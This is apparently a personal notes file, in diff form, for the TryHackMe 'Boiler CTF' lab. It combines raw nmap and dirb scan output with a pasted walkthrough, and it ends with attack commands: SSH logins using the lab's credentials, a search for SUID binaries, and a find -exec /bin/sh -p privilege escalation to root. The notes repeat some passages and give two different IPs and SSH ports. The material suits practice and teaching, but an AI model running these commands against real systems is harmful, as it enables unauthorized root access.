@@ -1,0 +1,314 @@
+(golum㉿kali)-[~]
+└─$ sudo nmap -A -sC -sV 10.10.161.91  
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-25 14:15 IST
+Stats: 0:01:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 78.33% done; ETC: 14:17 (0:00:28 remaining)
+Stats: 0:03:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 86.52% done; ETC: 14:18 (0:00:29 remaining)
+Stats: 0:05:57 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 99.99% done; ETC: 14:21 (0:00:00 remaining)
+Nmap scan report for 10.10.161.91
+Host is up (0.56s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.4.58.116
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+|_http-server-header: MiniServ/1.930
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=3/25%OT=21%CT=1%CU=42018%PV=Y%DS=4%DC=T%G=Y%TM=623D835
+OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10A%TI=Z%CI=RD%II=I%TS=8)SE
+OS:Q(SP=101%GCD=1%ISR=10A%TI=Z%CI=I%TS=8)OPS(O1=M505ST11NW6%O2=M505ST11NW6%
+OS:O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)WIN(W1=68DF%W2
+OS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNS
+OS:NW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
+OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
+OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
+OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
+OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 4 hops
+Service Info: OS: Unix
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT       ADDRESS
+1   678.92 ms 10.4.0.1
+2   ... 3
+4   566.55 ms 10.10.161.91
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 581.23 seconds
+
+
+
+
+
+└─$ dirb http://10.10.161.91                                                               255 ⨯
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Mar 25 14:15:13 2022
+URL_BASE: http://10.10.161.91/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.161.91/ ----
++ http://10.10.161.91/index.html (CODE:200|SIZE:11321)                                          
+==> DIRECTORY: http://10.10.161.91/joomla/                                                      
+==> DIRECTORY: http://10.10.161.91/manual/                                                      
++ http://10.10.161.91/robots.txt (CODE:200|SIZE:257)                                            
++ http://10.10.161.91/server-status (CODE:403|SIZE:300)                                         
+                                                                                                
+---- Entering directory: http://10.10.161.91/joomla/ ----
+==> DIRECTORY: http://10.10.161.91/joomla/_archive/                                             
+==> DIRECTORY: http://10.10.161.91/joomla/_database/                                            
+==> DIRECTORY: http://10.10.161.91/joomla/_files/                                               
+==> DIRECTORY: http://10.10.161.91/joomla/_test/                                                
+==> DIRECTORY: http://10.10.161.91/joomla/~www/                                                 
+==> DIRECTORY: http://10.10.161.91/joomla/administrator/                                        
+                                                                                                
+(!) FATAL: Too many errors connecting to host
+    (Possible cause: COULDNT CONNECT)
+                                                                               
+-----------------
+END_TIME: Fri Mar 25 15:09:41 2022
+DOWNLOADED: 5004 - FOUND: 3
+                                              
+
+
+
+
+
+
+
+└─$ dirb http://10.10.161.91/joomla                                               148 ⨯ 2 ⚙
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Mar 25 14:58:08 2022
+URL_BASE: http://10.10.161.91/joomla/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.161.91/joomla/ ----
+==> DIRECTORY: http://10.10.161.91/joomla/_archive/                                        
+==> DIRECTORY: http://10.10.161.91/joomla/_database/                                       
+==> DIRECTORY: http://10.10.161.91/joomla/_files/                                          
+==> DIRECTORY: http://10.10.161.91/joomla/_test/                                           
+==> DIRECTORY: http://10.10.161.91/joomla/~www/                                            
+==> DIRECTORY: http://10.10.161.91/joomla/administrator/                                   
+==> DIRECTORY: http://10.10.161.91/joomla/bin/                                             
+==> DIRECTORY: http://10.10.161.91/joomla/build/                                           
+==> DIRECTORY: http://10.10.161.91/joomla/cache/                                           
+==> DIRECTORY: http://10.10.161.91/joomla/components/                                      
+                                                                                           
+(!) FATAL: Too many errors connecting to host
+    (Possible cause: COULDNT CONNECT)
+                                                                               
+-----------------
+END_TIME: Fri Mar 25 15:09:41 2022
+DOWNLOADED: 1048 - FOUND: 0
+
+
+
+
+
+
+Robots.txt
+
+
+User-agent: *
+Disallow: /
+
+/tmp
+/.ssh
+/yellow
+/not
+/a+rabbit
+/hole
+/or
+/is
+/it
+
+079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
+
+
+Visit /joomla/_files
+
+
+Copying the text and then using the echo command with the base64 -d command, it was found that it was possible to double encoded Base64. Decoding again gives the text “Whoopsie daisy”. It was another rabbit hole.
+echo "VjJodmNITnBaU0JrWVdsemVRbz0K" | base64 -d
+echo "V2hvcHNpZSBkYWlzeQo=" | base64 -d
+
+
+Another URL that was interesting from the Directory Brute force was /_test/. Opening it in a Web Browser, it seemed to be the deployment of Sar2HTML. It is a report generator.
+
+http://10.10.140.202/joomla/_test/
+
+
+
+
+CTF Challenges
+Boiler CTF TryHackMe Walkthrough
+May 12, 2021 by Raj Chandel
+
+Today it is time to solve another challenge called “Boiler CTF”. It is available at TryHackMe for penetration testing practice. This challenge is of medium difficulty if you have the right basic knowledge and are attentive to little details that are required in the enumeration process. The credit for making this machine goes to MrSeth6797. The breakdown of the Machine with the redacted flags is as follow:
+
+Level: Medium
+Penetration Testing Methodology
+
+    Network Scanning
+        Nmap Scan
+    Enumeration
+        Enumerating FTP
+        Decoding ROT13
+        Enumerating robots.txt
+        Directory Bruteforce using dirb
+        Enumerating Joomla CMS
+        Enumerating Sar2HTML
+    Exploitation
+        Exploiting Remote Code Execution
+        Enumerating SSH Credentials for basterd
+        Enumerating Credentials for Stoner
+        Reading User Flag
+    Privilege Escalation
+        Enumerating SUID Permissions
+        Exploiting SUID permissions on find
+        Getting Root Shell
+        Reading Root Flag
+
+Walkthrough
+
+There are two flags in this machine to discover. After Booting up the target machine from the TryHackMe: Boiler CTF Page, An IP will be assigned to the machine and will be visible on that page as well.
+
+IP Address: 10.10.140.202
+
+Apart from the two flags, four questions are required as well to complete this machine. You can find the questions as the answers are discovered below.
+Network Scanning
+
+We will start a nmap scan with the -sC for Default Scripts and -SV for Scanning Versions, We are also scanning for all ports.
+nmap -sC -sV -Pn -p- 10.10.140.202
+
+Nmap was able to identify 4 services running on the target machine. It included the FTP (21), HTTP (80, 10000), and SSH on 65007.
+
+Q.2. What is on the highest port?
+
+ssh
+
+Q.3. What’s running on port 10000?
+
+Webmin
+
+We don’t have the credentials for SSH so we cannot enumerate them. Since Anonymous Login is enabled on FTP, Let’s being the enumeration from FTP.
+Enumeration
+
+Starting with the FTP service, we knew that we can log in as Anonymous from the Nmap scan we just performed. After logging in, we list the contents and find a hidden text file by the name of .info.txt.
+
+Q.1. File extension after anon login
+
+txt
+
+To take a closer look at it, it was transferred to the Local Kali Linux Machine using the get command. Reading the contents using the cat command, it was found that it contains some text that seems to be encoded. It read “Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!”. From the looks of it, it resembles the ROT13.
+ftp 10.10.140.202
+Anonymous
+ls -la
+get .info.txt
+bye
+
+To confirm the suspicion, the text was copied into a ROT13 to Plain text converter. Upon conversion, the text read “Just wanted to see if you find it. Lol. Remember: Enumeration is the key!” This text is more like a rabbit hole.
+
+Moving back to the Nmap scan, it can be observed that the HTTP service on port 80 has a robots.txt file. Upon viewing the robots.txt file on Web Browser, it was observed that there are a lot of entries. All the entries lead to nowhere and The ASCII text at the bottom when converted reads “dCode ASCII”. So, this is another one of those rabbit holes.
+http://10.10.140.202/robots.txt
+
+After traveling through the multiple rabbit holes, the enumeration took a turn when the directory brute force on HTTP service on port 80 detected some Joomla Files.
+dirb http://10.10.140.202
+
+To check if the Joomla CMS is indeed running on the target server, it was opened in the web browser. A site was loaded as shown in the screenshot shown below.
+
+Q.5. What’s CMS can you access?
+
+Joomla
+
+Q.6. Keep enumerating, you’ll know when you find it.
+
+No answer needed
+http://10.10.140.202/joomla/
+
+In the directory bruteforce, among other directories, there was a page by the name of /_files/. Opening it in a Web Browser it was found to be some encoded text. It seemed to be Base64 on first look. It reads “VjJodmNITnBaU0JrWVdsemVRbz0K”.
+http://10.10.140.202/joomla/_files/
+
+Copying the text and then using the echo command with the base64 -d command, it was found that it was possible to double encoded Base64. Decoding again gives the text “Whoopsie daisy”. It was another rabbit hole.
+
+VjJodmNITnBaU0JrWVdsemVRbz0K 
+
+echo "VjJodmNITnBaU0JrWVdsemVRbz0K" | base64 -d
+echo "V2hvcHNpZSBkYWlzeQo=" | base64 -d
+
+decoding it twice
+
+Another URL that was interesting from the Directory Brute force was /_test/. Opening it in a Web Browser, it seemed to be the deployment of Sar2HTML. It is a report generator.
+
+http://10.10.140.202/joomla/_test/
+
+Searching for exploit on the Web, there seemed to be a Remote Code Execution vulnerability in the Sar2HTML.
+
+
+Reading the exploit, it seemed that the plot parameter is injectable and when the command is entered, the output of the command can be viewed in the Select Host Drop Down option.
+
+
+basterd superduperp@$$
+
+ssh basterd@10.10.140.202 -p 55007
+superduperp@$$
+
+
+
+stoner
+#superduperp@$$no1knows
+
+su stoner
+superduperp@$$no1knows
+ls -la
+cat .secret
+cd .nano
+ls -la
+
+
+find / -perm -u=s 2>/dev/null
+
+
+/usr/bin/find . -exec /bin/sh -p \; -quit
+whoami
+cat /root/root.txt
